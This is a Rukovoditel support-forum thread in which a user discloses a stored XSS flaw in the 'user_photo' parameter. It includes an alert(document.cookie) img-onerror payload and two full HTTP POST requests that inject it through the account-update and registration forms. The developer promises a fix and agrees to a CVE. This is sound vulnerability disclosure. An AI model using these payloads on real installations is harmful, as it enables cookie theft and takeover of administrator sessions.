=== Content from forum.rukovoditel.net_fc4f4a4e_20250111_031512.html ===


# Rukovoditel Support Forum

Discussion, bug reports and help!

[Skip to content](#start_here)

Search

[Advanced search](./search.php?sid=e419188ec0314e41dda40f23ab3bbac1 "Advanced search")

* Quick links

  + [Unanswered topics](./search.php?search_id=unanswered&sid=e419188ec0314e41dda40f23ab3bbac1)
  + [Active topics](./search.php?search_id=active_topics&sid=e419188ec0314e41dda40f23ab3bbac1)
  + [Search](./search.php?sid=e419188ec0314e41dda40f23ab3bbac1)
* [FAQ](/app.php/help/faq?sid=e419188ec0314e41dda40f23ab3bbac1 "Frequently Asked Questions")
* [Login](./ucp.php?mode=login&redirect=viewtopic.php%3Ft%3D5071&sid=e419188ec0314e41dda40f23ab3bbac1 "Login")
* [Register](./ucp.php?mode=register&sid=e419188ec0314e41dda40f23ab3bbac1)

* [About Rukovoditel](https://www.rukovoditel.net)
  [Forum](./index.php?sid=e419188ec0314e41dda40f23ab3bbac1)
  [Bug Report](./viewforum.php?f=6&sid=e419188ec0314e41dda40f23ab3bbac1)
  [Previous versions](./viewforum.php?f=11&sid=e419188ec0314e41dda40f23ab3bbac1)
  [Bug Report version 3.5.4](./viewforum.php?f=27&sid=e419188ec0314e41dda40f23ab3bbac1)
* [Search](./search.php?sid=e419188ec0314e41dda40f23ab3bbac1 "View the advanced search options")

## [stored XSS (Cross-site scripting) vulnerability](./viewtopic.php?t=5071&sid=e419188ec0314e41dda40f23ab3bbac1)

[Post Reply](./posting.php?mode=reply&t=5071&sid=e419188ec0314e41dda40f23ab3bbac1 "Post a reply")

* [Print view](./viewtopic.php?t=5071&sid=e419188ec0314e41dda40f23ab3bbac1&view=print "Print view")

Search

[Advanced search](./search.php?sid=e419188ec0314e41dda40f23ab3bbac1 "Advanced search")

4 posts
• Page **1** of **1**

[Toxi4](./memberlist.php?mode=viewprofile&u=1366&sid=e419188ec0314e41dda40f23ab3bbac1)
**Posts:** [6](./search.php?author_id=1366&sr=posts&sid=e419188ec0314e41dda40f23ab3bbac1) **Joined:** 08 Apr 2024, 14:31
**Name:** Anton Kartunov
**Location:** Russia

### [stored XSS (Cross-site scripting) vulnerability](./viewtopic.php?p=20116&sid=e419188ec0314e41dda40f23ab3bbac1#p20116)

* [Quote](./posting.php?mode=quote&p=20116&sid=e419188ec0314e41dda40f23ab3bbac1 "Reply with quote")

[Post](./viewtopic.php?p=20116&sid=e419188ec0314e41dda40f23ab3bbac1#p20116 "Post")
by **[Toxi4](./memberlist.php?mode=viewprofile&u=1366&sid=e419188ec0314e41dda40f23ab3bbac1)** » 08 Apr 2024, 14:58

Hey!

I found an xss vulnerability in the latest version of your application.

The vulnerability is in the **user\_photo** parameter and can be inserted in several places.

Payload: **"><img src=a onerror=alert(document.cookie)>**

1. Editing the personal page "My Page"

Code: Select all

```
POST /index.php?module=users/account&action=update&token=mzjjjrOgze HTTP/1.1
Host: 192.168.0.15
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=---------------------------304983279014015673452478204380
Cookie: [Cookie]

-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="form_session_token"

mzjjjrOgze
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="fields[7]"

user
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="fields[8]"

user
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="user_photo"

user_2_1712564921.jpeg"><img src=a onerror=alert(document.cookie)>
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="delete_user_photo"

0
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="fields[9]"

user@user.com
-----------------------------304983279014015673452478204380
Content-Disposition: form-data; name="fields[13]"

english.php
-----------------------------304983279014015673452478204380--
```

It will triggerd on the personal account page:
> /index.php?module=users/account

;

And when on the all users page, at the admin panel:
> /index.php?module=items/items&path=1

[![XSS.png](./download/file.php?id=7698&t=1&sid=e419188ec0314e41dda40f23ab3bbac1 "XSS.png (38.54 KiB) Viewed 2479 times")](./download/file.php?id=7698&sid=e419188ec0314e41dda40f23ab3bbac1&mode=view)

[![XSS.png](./download/file.php?id=7698&t=1&sid=e419188ec0314e41dda40f23ab3bbac1 "XSS.png (38.54 KiB) Viewed 2479 times")](./download/file.php?id=7698&sid=e419188ec0314e41dda40f23ab3bbac1&mode=view)

2. If the registration mechanism is enabled, then you can insert a payload in the same parameter

Code: Select all

```
POST /index.php?module=users/registration&action=save HTTP/1.1
Host: 192.168.0.15
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: multipart/form-data; boundary=---------------------------23053781821106606461863123342
Cookie: [Cookie]

-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="form_session_token"

Hz7oBzXORq
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="fields[12]"

user2
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="password"

useruser
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="fields[7]"

user2
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="fields[8]"

user2
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="user_photo"

tmp_photo_1712573394_Hz7oBzXORq.png"><img src=a onerror=alert(document.cookie)>
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="delete_user_photo"

0
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="fields[9]"

user2@user2.com
-----------------------------23053781821106606461863123342
Content-Disposition: form-data; name="fields[13]"

russian.php
-----------------------------23053781821106606461863123342--
```

It will be triggerd when admin goes to the page to confirm new users.

This vulnerability can lead to theft of administrative cookies or redirection to the attacker's website.

I have used Rukovoditel 3.5.2
Attachments

[![XSS1.png](./download/file.php?id=7699&t=1&sid=e419188ec0314e41dda40f23ab3bbac1 "XSS1.png (35.98 KiB) Viewed 2479 times")](./download/file.php?id=7699&sid=e419188ec0314e41dda40f23ab3bbac1&mode=view)

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=2_1441180972.png)](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)
[support](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)
Site Admin
**Posts:** [6438](./search.php?author_id=2&sr=posts&sid=e419188ec0314e41dda40f23ab3bbac1) **Joined:** 19 Oct 2014, 18:22
**Name:** Sergey Kharchishin
**Location:** Russia, Evpatoriya

### [Re: stored XSS (Cross-site scripting) vulnerability](./viewtopic.php?p=20118&sid=e419188ec0314e41dda40f23ab3bbac1#p20118)

* [Quote](./posting.php?mode=quote&p=20118&sid=e419188ec0314e41dda40f23ab3bbac1 "Reply with quote")

[Post](./viewtopic.php?p=20118&sid=e419188ec0314e41dda40f23ab3bbac1#p20118 "Post")
by **[support](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)** » 08 Apr 2024, 19:38

Thank you. Will be fixed in 3.5.3

[Top](#top "Top")

[Toxi4](./memberlist.php?mode=viewprofile&u=1366&sid=e419188ec0314e41dda40f23ab3bbac1)
**Posts:** [6](./search.php?author_id=1366&sr=posts&sid=e419188ec0314e41dda40f23ab3bbac1) **Joined:** 08 Apr 2024, 14:31
**Name:** Anton Kartunov
**Location:** Russia

### [Re: stored XSS (Cross-site scripting) vulnerability](./viewtopic.php?p=20120&sid=e419188ec0314e41dda40f23ab3bbac1#p20120)

* [Quote](./posting.php?mode=quote&p=20120&sid=e419188ec0314e41dda40f23ab3bbac1 "Reply with quote")

[Post](./viewtopic.php?p=20120&sid=e419188ec0314e41dda40f23ab3bbac1#p20120 "Post")
by **[Toxi4](./memberlist.php?mode=viewprofile&u=1366&sid=e419188ec0314e41dda40f23ab3bbac1)** » 09 Apr 2024, 00:18

Awesome! Can I register a CVE with this vulnerability? After you will fixing it.

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=2_1441180972.png)](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)
[support](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)
Site Admin
**Posts:** [6438](./search.php?author_id=2&sr=posts&sid=e419188ec0314e41dda40f23ab3bbac1) **Joined:** 19 Oct 2014, 18:22
**Name:** Sergey Kharchishin
**Location:** Russia, Evpatoriya

### [Re: stored XSS (Cross-site scripting) vulnerability](./viewtopic.php?p=20124&sid=e419188ec0314e41dda40f23ab3bbac1#p20124)

* [Quote](./posting.php?mode=quote&p=20124&sid=e419188ec0314e41dda40f23ab3bbac1 "Reply with quote")

[Post](./viewtopic.php?p=20124&sid=e419188ec0314e41dda40f23ab3bbac1#p20124 "Post")
by **[support](./memberlist.php?mode=viewprofile&u=2&sid=e419188ec0314e41dda40f23ab3bbac1)** » 09 Apr 2024, 07:33

Yes

[Top](#top "Top")

[Post Reply](./posting.php?mode=reply&t=5071&sid=e419188ec0314e41dda40f23ab3bbac1 "Post a reply")

* [Print view](./viewtopic.php?t=5071&sid=e419188ec0314e41dda40f23ab3bbac1&view=print "Print view")

Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
Sort by: AuthorPost timeSubject
Direction: AscendingDescending

---

4 posts
• Page **1** of **1**

[Return to “Bug Report version 3.5.4”](./viewforum.php?f=27&sid=e419188ec0314e41dda40f23ab3bbac1)

Jump to

* [Discussion](./viewforum.php?f=2&sid=e419188ec0314e41dda40f23ab3bbac1)
* [Suggestions](./viewforum.php?f=3&sid=e419188ec0314e41dda40f23ab3bbac1)
* [Plugins](./viewforum.php?f=26&sid=e419188ec0314e41dda40f23ab3bbac1)
* [Translations](./viewforum.php?f=5&sid=e419188ec0314e41dda40f23ab3bbac1)
* [Bug Report](./viewforum.php?f=6&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.6.1](./viewforum.php?f=28&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Previous versions](./viewforum.php?f=11&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.4](./viewforum.php?f=15&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.3](./viewforum.php?f=14&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.2](./viewforum.php?f=13&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.1](./viewforum.php?f=12&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.0](./viewforum.php?f=10&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 1.9](./viewforum.php?f=9&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 1.8](./viewforum.php?f=8&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 1.7](./viewforum.php?f=7&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 1.6 (or older)](./viewforum.php?f=4&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.5](./viewforum.php?f=16&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.6](./viewforum.php?f=17&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.7](./viewforum.php?f=18&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.8](./viewforum.php?f=19&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 2.9](./viewforum.php?f=20&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.0](./viewforum.php?f=21&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.1](./viewforum.php?f=22&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.2](./viewforum.php?f=23&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.3](./viewforum.php?f=24&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.4.4](./viewforum.php?f=25&sid=e419188ec0314e41dda40f23ab3bbac1)
* [↳   Bug Report version 3.5.4](./viewforum.php?f=27&sid=e419188ec0314e41dda40f23ab3bbac1)

* [About Rukovoditel](https://www.rukovoditel.net) [Forum](./index.php?sid=e419188ec0314e41dda40f23ab3bbac1)
* All times are UTC+04:00
* [Delete cookies](./ucp.php?mode=delete_cookies&sid=e419188ec0314e41dda40f23ab3bbac1)

Powered by [phpBB](https://www.phpbb.com/)® Forum Software © phpBB Limited

[Privacy](./ucp.php?mode=privacy&sid=e419188ec0314e41dda40f23ab3bbac1 "Privacy")
|
[Terms](./ucp.php?mode=terms&sid=e419188ec0314e41dda40f23ab3bbac1 "Terms")

###

 ![](https://mc.yandex.ru/watch/57675358)


